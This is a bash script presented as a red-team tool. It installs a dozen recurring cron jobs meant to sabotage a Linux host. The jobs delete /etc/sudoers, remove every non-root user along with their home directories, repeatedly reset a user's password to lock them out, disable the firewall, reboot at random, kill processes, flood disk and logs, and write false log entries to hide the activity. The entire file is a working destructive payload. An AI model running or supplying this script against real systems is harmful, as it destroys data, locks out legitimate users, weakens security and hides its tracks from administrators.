#!/bin/bash

# Red Team - Cron Job Flood with System Manipulation
# This script creates a variety of cron jobs that manipulate different areas of the system at different intervals
# The goal is to overwhelm the Blue Team by constantly changing configurations, spawning processes, and altering user experience

CRON_LOG="/tmp/cron_flood.log"
TARGET_USER="targetuser"

# Function to add a cron job
add_cron_job() {
    JOB_CMD=$1
    INTERVAL=$2
    echo "[+] Adding cron job: $JOB_CMD with interval $INTERVAL"
    (crontab -l 2>/dev/null; echo "$INTERVAL $JOB_CMD") | crontab -
}

# Clear previous logs
echo "[+] Starting cron flood at $(date)" > $CRON_LOG

# 1. Cron job to fill /tmp directory with junk files every 5 minutes
JUNK_FILL_CMD="dd if=/dev/urandom of=/tmp/junk_\$(date +\%s).bin bs=1M count=10"
add_cron_job "$JUNK_FILL_CMD" "*/5 * * * *"

# 2. Cron job to randomly modify /etc/hosts every 10 minutes
HOSTS_MOD_CMD="echo '127.0.0.1 myfakesite.com' >> /etc/hosts"
add_cron_job "$HOSTS_MOD_CMD" "*/10 * * * *"

# 3. Cron job to randomly restart the SSH service every 15 minutes
SSH_RESTART_CMD="systemctl restart ssh"
add_cron_job "$SSH_RESTART_CMD" "*/15 * * * *"

# 4. Cron job to flood the system logs by echoing junk messages every 2 minutes
LOG_SPAM_CMD="echo 'CRITICAL ERROR: System malfunction $(date)' >> /var/log/syslog"
add_cron_job "$LOG_SPAM_CMD" "*/2 * * * *"

# 5. Cron job to change the target user’s password every 7 minutes (lock user out)
CHANGE_PASS_CMD="echo '$TARGET_USER:newpassword' | chpasswd"
add_cron_job "$CHANGE_PASS_CMD" "*/7 * * * *"

# 6. Cron job to randomly remove the sudoers file every 20 minutes (system chaos)
REMOVE_SUDOERS_CMD="rm -f /etc/sudoers"
add_cron_job "$REMOVE_SUDOERS_CMD" "*/20 * * * *"

# 7. Cron job to add random nonsense to .bashrc every 8 minutes (annoying shell messages)
BASHRC_MOD_CMD="echo 'echo Welcome to your doomed system!' >> /home/$TARGET_USER/.bashrc"
add_cron_job "$BASHRC_MOD_CMD" "*/8 * * * *"

# 8. Cron job to randomly kill processes every 3 minutes (random process disruption)
KILL_PROCS_CMD="killall -9 $(ps -U $TARGET_USER | awk '{print $1}' | shuf | head -n 1)"
add_cron_job "$KILL_PROCS_CMD" "*/3 * * * *"

# 9. Cron job to reboot the system randomly every hour (complete chaos)
REBOOT_CMD="if (( RANDOM % 2 )); then reboot; fi"
add_cron_job "$REBOOT_CMD" "0 * * * *"

# 10. Cron job to disable the firewall every 25 minutes (security compromise)
DISABLE_FIREWALL_CMD="ufw disable"
add_cron_job "$DISABLE_FIREWALL_CMD" "*/25 * * * *"

# 11. Cron job to remove all users except root every 30 minutes
REMOVE_USERS_CMD="for user in \$(cut -d: -f1 /etc/passwd | grep -v 'root'); do userdel -r \$user; done"
add_cron_job "$REMOVE_USERS_CMD" "*/30 * * * *"

# 12. Cron job to create a fake cron flood log entry to hide its actions
CRON_SPAM_CMD="echo 'Cron job completed at $(date)' >> $CRON_LOG"
add_cron_job "$CRON_SPAM_CMD" "*/1 * * * *"

# Final log output
echo "[+] Cron flood installed at $(date). Cron jobs running on various intervals." >> $CRON_LOG